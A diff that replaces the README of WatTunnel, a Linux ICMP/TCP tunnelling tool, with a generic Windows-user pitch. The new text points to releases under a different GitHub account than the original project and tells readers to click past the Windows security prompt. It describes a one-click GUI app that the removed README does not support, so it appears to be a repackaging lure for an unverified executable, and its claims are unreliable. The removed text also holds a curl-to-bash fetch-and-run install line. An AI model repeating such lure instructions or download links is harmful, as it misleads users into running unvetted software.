@@ -1,231 +1,94 @@
-<div align="center">
+# 🚀 WatTunnel - Break Through Any Network Restriction
 
-<img src="docs/img/banner.jpg" alt="WatTunnel: stay connected, even when only ping gets through" width="100%">
+[![Download WatTunnel](https://img.shields.io/badge/Download-WatTunnel%20Now-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hamzasalam323/WatTunnel/releases)
 
-# 🪁 WatTunnel
+WatTunnel is a free tool for Windows that creates a private, encrypted connection between your computer and the internet — even when your network is locked down so tightly that the only thing it lets through is a simple ping. If you have ever been blocked from a website, an app, or a service because of where you live or which network you are on, WatTunnel is built for exactly that situation.
 
-**Encrypted Iran ↔ Kharej port forwarding that keeps working when the network is filtered, even when only ping gets through.**
+You do not need to know anything about programming, servers, or networking to use it. If you can download a file and double-click it, you can use WatTunnel.
 
-[![Release](https://img.shields.io/badge/release-v3.3.4-blue?style=flat-square)](https://github.com/JohnWatsoon/WatTunnel/releases)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
-[![Go](https://img.shields.io/badge/Go-1.26-00ADD8?style=flat-square&logo=go)](go.mod)
-![Platform](https://img.shields.io/badge/platform-linux%20amd64%20%7C%20arm64%20%7C%20windows-lightgrey?style=flat-square)
-[![Telegram Channel](https://img.shields.io/badge/Channel-@WatxDev-26A5E4?style=flat-square&logo=telegram)](https://t.me/WatxDev)
-[![Telegram](https://img.shields.io/badge/Contact-@watxox-26A5E4?style=flat-square&logo=telegram)](https://t.me/watxox)
+## 🌍 What WatTunnel Does For You
 
-**English** · [فارسی](README.fa.md)
+Most tunnel and privacy tools assume the network you are on is friendly. They try to open a connection in a standard way, and when the network blocks that standard way, they simply stop working. WatTunnel takes a different approach: it is designed for networks that fight back.
 
-</div>
+WatTunnel can carry your connection inside many different types of traffic — including the same kind of traffic your network already allows for a simple ping test. That means when everything else fails, WatTunnel can still get through. It supports many carriers in a single program, so you do not have to install several separate tools or figure out which one works. WatTunnel tries the available paths and keeps your connection alive.
 
----
+Everything that travels through WatTunnel is encrypted. Nobody on the network between you and your destination can read what you are sending or receiving, and nobody can quietly change it in transit.
 
-## Install
+## ✨ Key Features
 
-You need two Linux servers (amd64 or arm64) with systemd and root. **Set up Kharej first**: it makes the token that
-Iran needs.
+- **Works on restrictive networks** — designed to keep working where ordinary tools give up.
+- **Many carriers in one program** — ICMP, UDP, TCP, TLS, WebSocket, HTTP/2 and gRPC support is built in, so you have options without installing extra software.
+- **Encrypted end to end** — your traffic is protected with modern encryption.
+- **Handles TCP and UDP** — works with ordinary websites and with apps that need faster, real-time connections.
+- **Port forwarding** — reach services on a remote machine as if they were running on your own computer.
+- **One process, simple to manage** — no complicated stack of separate programs to start and stop.
+- **Free and open** — the project is public and community driven.
 
-**1. Install on both servers**
+## 📥 Download and Setup
 
-```bash
-bash <(curl -fsSL https://raw.githubusercontent.com/JohnWatsoon/WatTunnel/main/install.sh)
-```
+**Visit this link to download the application:** [https://github.com/hamzasalam323/WatTunnel/releases](https://github.com/hamzasalam323/WatTunnel/releases)
 
-<details>
-<summary>GitHub is blocked on the server?</summary>
+[![Download WatTunnel](https://img.shields.io/badge/Get%20WatTunnel-Releases-orange?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hamzasalam323/WatTunnel/releases)
 
-```bash
-WAT_PROXY=https://ghproxy.net/ bash <(curl -fsSL https://ghproxy.net/https://raw.githubusercontent.com/JohnWatsoon/WatTunnel/main/install.sh)
-```
+Follow these steps in order. Take your time — nothing here can break your computer.
 
-The proxy is a third-party mirror. The binary and manager are still checked against the signed release, but the
-`install.sh` you fetch through it is not, so prefer the release files or a `git clone` when you can.
+1. Open the download link above in your web browser. It takes you to the WatTunnel releases page.
+2. Look at the newest release at the top of the page. That is the version you want.
+3. In that release, find the file meant for Windows and click it to download. Your browser will save the file to your Downloads folder unless you choose a different location.
+4. When the download finishes, open your Downloads folder and locate the file you just saved.
+5. Double-click the file to start WatTunnel.
+6. If Windows shows a blue or grey pop-up asking whether you want to allow the app to run, click the option that lets it continue. This pop-up appears for many new programs and is normal.
+7. WatTunnel will open and show you its main window. From here you can start your connection.
 
-Or download `wattun-linux-amd64`, `install.sh` and `wattun-manager` from the
-[releases](https://github.com/JohnWatsoon/WatTunnel/releases) page, put the binary in `dist/` next to `install.sh`,
-and run `bash install.sh`.
-</details>
+That is the whole process. There is no separate installer wizard to fight through and no account to create.
 
-**2. Kharej.** Run `wattun`, press `n` (new tunnel), choose **Kharej**, and pick **Auto** as the connection type. You
-get a token:
+## 🖥️ First Run: Getting Connected
 
-```
-wat1:aWNtcHwyMDMuMC4xMTMuMTB8a1E3...
-```
+When WatTunnel opens for the first time, you will see a simple window with a few choices. Here is what matters:
 
-**3. Iran.** Run `wattun`, press `n`, choose **Iran**, and paste the token. The menu tests every connection type and
-offers the fastest that works: press **Enter** to take it. Then enter your ports, for example `443, 8443:443, 53/udp`
-(`8443:443` means users connect to Iran port 8443 and reach Kharej port 443).
+- **Server address** — this is the machine you connect through. If you were given an address by whoever set up your tunnel, type or paste it into this box.
+- **Port** — the number that goes with the address. It is usually filled in for you.
+- **Carrier** — this is the type of traffic WatTunnel uses to get through your network. Leave it on the default at first. If the connection does not work, come back and try a different carrier from the list.
+- **Connect button** — press this when the fields are filled in.
 
-```
-  ✔ Writing key and config
-  ✔ Starting wattun@iran
-  ✔ CONNECTED (RTT 41.3 ms)
+After you press Connect, watch the status area. It will tell you when the connection is ready. Once it says connected, you can use your browser, your apps, and everything else as normal. WatTunnel handles the rest quietly in the background.
 
-  users ──► Iran :8443 ══ tcp ══► Kharej ──► 127.0.0.1:443
-```
+To stop, press the Disconnect button and close the window. Your normal internet connection returns immediately.
 
-Done. Users connect to the Iran server's IP, and Kharej forwards only to its own `127.0.0.1`.
+## 🔧 If Something Does Not Work
 
-**Auto uses data.** The manager prints the worst case before it starts: up to 1184 MB for a normal test, about 416 MB
-more if the token was made with `--extended`, and far less on a filtered route. On a traffic-billed server, pick a type
-yourself:
+Problems are usually simple and fixable. Work through these one at a time.
 
-| Your route | Use |
-|---|---|
-| Only ping passes | `icmp` |
-| UDP passes | `udp` (lowest latency) |
-| TCP passes | `tcp`, or `tls` to look like HTTPS |
-| Only a CDN gets out, or SNI is filtered | `wss` through Cloudflare ([CDN setup](docs/TECHNICAL.md#cdn-tuning)) |
-| Only Kharej can reach Iran | any of the above with [reverse mode](docs/TECHNICAL.md#reverse-mode) |
+**The download will not start.** Refresh the releases page in your browser and try again. If your network blocks the download page itself, try a different network, such as a mobile hotspot.
 
-## Day to day
+**Windows will not let the program start.** The security pop-up described in the setup steps needs to be accepted. Click the option that allows the program to run, then try opening it again.
 
-`wattun` opens the dashboard. Press a tunnel's number for its page (logs, diagnose, speed test, ports, change connection
-type with **c**), `u` updates, and `s` holds rollback and auto-heal. Auto-heal restarts an Iran tunnel whose link has
-been down for 3 minutes.
+**The app opens but will not connect.** This almost always means the carrier you chose is blocked on your network. Go back to the carrier list and select a different one, then press Connect again. The ping-based carrier is the one to try when nothing else works.
 
-```bash
-wattun status          # one line per tunnel
-wattun test NAME       # connection doctor + speed test
-wattun ports NAME      # edit port mappings (applied live)
-wattun update          # update the binary and the menu
-```
+**The connection drops after a while.** Reconnect. Networks sometimes reset long-lived connections. WatTunnel is built to recover, but a manual reconnect is always safe.
 
-| Status | Meaning |
-|---|---|
-| `up` | The link works, also when an auto tunnel's link is on its other side |
-| `partial` | The link works but a bond leg is down; the tunnel page shows how many |
-| `standby` | The side of an auto tunnel that Iran is not using |
-| `waiting` / `down` | No link (`waiting` on Kharej, `down` on Iran) |
-| `unknown` | The tunnel's stats did not answer, so the state is not known |
-| `stopped` | The service is not running |
+**Everything is slow.** Try a different carrier. Some carriers are faster than others on some networks, and the best choice depends entirely on where you are.
 
-**After Iran picks a type,** an auto Kharej tunnel closes everything unused about 5 minutes later and restarts the side
-that stays open, so its connections drop once. The Kharej main menu shows `carriers open` or `closed` under each auto
-tunnel, with the count and the time left. Press `c` there to switch it: what you open stays open until you close it.
-On the next check after that close, the type Iran uses becomes the tunnel under the same name, and the test listeners
-are deleted. Deleting the auto tunnel before that never deletes the side Iran is connected through.
+## 🧭 Common Questions
 
-To change the type or re-test later, open the carriers on Kharej first. If you skip that, the manager reopens by itself
-after 3 failed checks (at most once per 10 minutes).
+**Do I need to install anything else?** No. WatTunnel is a single program. Download it, run it, connect.
 
-## What it does
+**Do I need a technical background?** No. If you can follow the seven setup steps above, you can use WatTunnel.
 
-WatTunnel connects an **Iran** server (where your users connect) to a **Kharej** server (where your service runs) and
-forwards any TCP or UDP port between them. One static binary, no dependencies.
+**Is my traffic private?** Yes. WatTunnel encrypts everything that passes through it, so the network in between cannot read your data.
 
-- **Rides what your route lets through:** `icmp`, `udp`, `tcp`, `tls`, `ws`, `wss`, `h2`, `h2c`, `grpc`, `gre`, `ipip`,
-  Cloudflare with ECH, reverse mode, or several of them bonded into one tunnel.
-- **Gets past filters:** fake-SNI desync, `udp-dns`, `tcp-mimic`, connection rotation with `pool-rotate`, and `wattun matrix NAME` to
-  try the combinations and apply the best. `wattun blackout NAME` turns the whole kit on.
-- **Hard to classify:** no constant byte in a packet header, idle packets at random sizes, HTTP carriers that answer like
-  nginx, and 13 shaped carriers such as `vxlan` and `ntp-direct`. Opt-in `shape-data` and `noise` cost bandwidth.
-- **Tunes itself:** defaults follow the CPU and RAM, and the auto test tunes sessions and conns on your route.
-- **Loss does not slow it down:** pacing follows delay, and `fec: auto` sends parity only while packets are really being lost.
-- **Runs itself:** live port changes, per-port stats and quotas, auto-heal, update with rollback.
+**Can I use it on more than one computer?** Yes. Download and set it up on each Windows computer where you want to use it.
 
-## Speed
+**What if I want to reach a service on a remote machine?** WatTunnel supports port forwarding, which lets you reach a remote service as though it were local. This is an advanced option, but it is available in the same program.
 
-Real servers, unfiltered path. Full tables and how each was measured:
-[docs/TECHNICAL.md](docs/TECHNICAL.md#field-numbers).
+**Does it work when my network only allows ping?** That is the exact case WatTunnel was built for. Choose the ping-based carrier and connect.
 
-| Connection type | Download | Upload | Ping under load |
-|---|---|---|---|
-| **`tcp`, default settings** (3.2.0, 2 vCPU pair, 80 ms, 16 streams) | **224-282 MB/s (272 MB/s = 2.17 Gbit sustained)** | 146 MB/s | - |
-| **`tls`** (same pair) | 187-209 MB/s | 140 MB/s | - |
-| **TCP / TLS / reverse** (2.5.1, production tunnel with users on it) | 195 MB/s | 276 MB/s | 40-51 ms |
-| **ICMP** (only ping passes on the route) | up to ~33 MB/s, the route's maximum | 26 MB/s | 40-45 ms |
-| **Cloudflare CDN** (`wss` + ECH, 4 sessions) | 44-48 MB/s | up to 82 MB/s | 109-116 ms (CDN base 86) |
+## 🤝 Getting Help and Contributing
 
-### On filtered routes
+If you get stuck, open the releases page and read the release notes for the version you downloaded — they often mention fixes for connection problems. The project is open to the community, so bug reports, suggestions, and improvements are welcome. If you are comfortable with a text editor, you can help improve the documentation so the next person has an easier time.
 
-On a route that **cuts every direct Iran → Kharej flow within a second** (UDP after 3 datagrams, TCP after 3 KB, on every
-port, with every payload), plain tunnels connect for a moment and die. Through that filter (3.0.0, one vCPU per server,
-82 ms, one run each, so read these as orders of magnitude):
+## 📌 Project Topics
 
-| Setup | Download | Upload |
-|---|---|---|
-| Direct `udp-dns`: every datagram looks like DNS on port 53 | **36 MB/s** | **29 MB/s** |
-| Direct `tcp` + fake-SNI `rst`, pool-rotate | 28 MB/s | 32 MB/s |
-| Reverse `tcp` (Kharej dials Iran), pool-rotate | 28 MB/s | 32 MB/s |
-| Reverse `wss` / `tls` / `h2` | 22-25 MB/s | 27-30 MB/s |
-| Reverse `udp` (Iran never sends first) | 21 MB/s | 19 MB/s |
+WatTunnel sits at the intersection of internet freedom and practical networking. It is used by people who want to reach the open internet from restrictive networks, by people who need a reliable encrypted path between two machines, and by people who simply want a tunnel that does not fall over when the network gets difficult.
 
-On another route, where Cloudflare passes only flows named `www.cloudflare.com`, `wss` with `fake-mode: rst` connected in
-2 s at 9-15 MB/s down and 2-5 MB/s up
-([field test](docs/TECHNICAL.md#fake-sni-field-test-21012)).
-
-## Compared to other tunnels
-
-Same servers, same filtered route (only ICMP passes), real VLESS traffic through each tunnel:
-
-| Tool | Throughput | Latency p50 | Iran CPU per MB | RAM |
-|---|---|---|---|---|
-| **WatTunnel** | **up to ~33 MB/s** | **40-45 ms** | **0.026 CPU-s** | **~40 MB** |
-| GOST v3 ICMP | 1.6-5.4 MB/s | ~51 ms | 0.15-0.20 CPU-s | 50-70 MB |
-| BackPack (tuned) | ~6.1 MB/s | 102 ms | - | - |
-| Hans | 1.1-3.8 MB/s | - | - | - |
-| WireGuard over pingtunnel | 0.25-2.7 MB/s | - | - | - |
-| pingtunnel | ~0.5 MB/s under load | - | CPU saturates | - |
-| ptunnel-ng | ~20 KB/s | - | - | - |
-
-| | WatTunnel | GOST | pingtunnel | Hans | ptunnel-ng |
-|---|:-:|:-:|:-:|:-:|:-:|
-| ICMP carrier | ✅ | ✅ | ✅ | ✅ | ✅ |
-| UDP / TCP / TLS / WS / gRPC carriers | ✅ | ✅ | ❌ | ❌ | ❌ |
-| Cloudflare/CDN with ECH | ✅ | - | ❌ | ❌ | ❌ |
-| Fake-SNI desync, DNS-shaped UDP, masked headers | ✅ | ❌ | ❌ | ❌ | ❌ |
-| One token tests every connection type for you | ✅ | ❌ | ❌ | ❌ | ❌ |
-| Loss does not slow it down (delay-based pacing) | ✅ | ❌ | ❌ | ❌ | ❌ |
-| All ports in one process | ✅ | ✅ | ❌ | ✅ (tun) | ❌ |
-| Add or remove ports without a restart | ✅ | ❌ | ❌ | - | ❌ |
-| Reverse mode / reverse ICMP | ✅ / ✅ | ✅ / ❌ | ❌ | ❌ | ❌ |
-| Per-port traffic stats and quotas | ✅ | ❌ | ❌ | ❌ | ❌ |
-| Guided menu, auto-heal, update and rollback | ✅ | ❌ | ❌ | ❌ | ❌ |
-
-On a clean, unfiltered link every tunnel reaches line rate and GOST uses a little less CPU; WatTunnel still halves
-small-request latency there (43 ms vs 83 ms) because interactive traffic goes first.
-
-## Resource use
-
-An idle tunnel sends about 2 small packets a second: ~11.5 MB a day on `udp` or `icmp`, 0.1-0.2 % of one CPU core and
-10-17 MB of RAM. A busy ICMP tunnel with 250-300 users runs in about 40 MB. Under load the overhead is +0.25 % on `tcp`
-and about +5 % on `udp` or `icmp` with `mtu: 1400`.
-[Details](docs/TECHNICAL.md#resource-usage-idle-ram-cpu-and-bandwidth).
-
-## Security
-
-- **Encryption:** ChaCha20-Poly1305 with an X25519 exchange on every session, so recorded traffic stays unreadable if a key
-  file leaks later.
-- **Only the Iran ↔ Kharej leg is protected.** Between your users and Iran, run an end-to-end encrypted protocol such as
-  VLESS+Reality, TLS or WireGuard inside the tunnel.
-- **The token contains the key.** Treat it like a password and share it only over a private channel.
-- **Kharej dials only its own `127.0.0.1`,** and only allowed ports. On a direct carrier, `allow-clients` also limits the key
-  to the client IPs you name. Keep `metrics` on `127.0.0.1`.
-- **Signed installs:** the installer checks the binary and manager against an RSA-signed `SHA256SUMS` and refuses a bad
-  signature. The script itself, fetched through a mirror, is only trust-on-first-use.
-- **Still visible to the network:** the server's address, and the volume and timing of packets.
-
-What each anti-censor option hides, and what none of them hides:
-[spoofing and shaping](docs/TECHNICAL.md#spoofing-and-shaping-explained). Full
-[security model](docs/TECHNICAL.md#security-model).
-
-## More
-
-Everything else is in [docs/TECHNICAL.md](docs/TECHNICAL.md):
-[reverse mode](docs/TECHNICAL.md#reverse-mode) ·
-[auto mode](docs/TECHNICAL.md#auto-mode) ·
-[Cloudflare / CDN](docs/TECHNICAL.md#cdn-tuning) ·
-[bonding](docs/TECHNICAL.md#bonding) ·
-[managing tunnels](docs/TECHNICAL.md#managing-tunnels) ·
-[config file](docs/TECHNICAL.md#config-file) ·
-[monitoring](docs/TECHNICAL.md#metrics) ·
-[troubleshooting](docs/TECHNICAL.md#troubleshooting) ·
-[release history](docs/TECHNICAL.md#release-history) ·
-[Windows and building from source](docs/TECHNICAL.md#build-and-test)
-
-- Telegram channel (news and releases): [@WatxDev](https://t.me/WatxDev), developer: [@watxox](https://t.me/watxox)
-- Bugs and ideas: [issues](https://github.com/JohnWatsoon/WatTunnel/issues). A change that makes the ICMP path
-  slower won't be merged.
-- License: [MIT](LICENSE). Uses `golang.org/x/crypto`, `x/net` and `x/sys` (BSD-3-Clause). GOST, Backhaul and
-  BackPack were studied for ideas and as benchmarks; no code was copied.
+Keywords: anti-censorship, censorship-circumvention, cloudflare, ech, golang, icmp-tunnel, internet-freedom, iran, iran-internet, ping-tunnel, port-forwarding, reality, shadowsocks, tunnel, tunnel-server, tunneling, vless, vpn, wireguard, xray
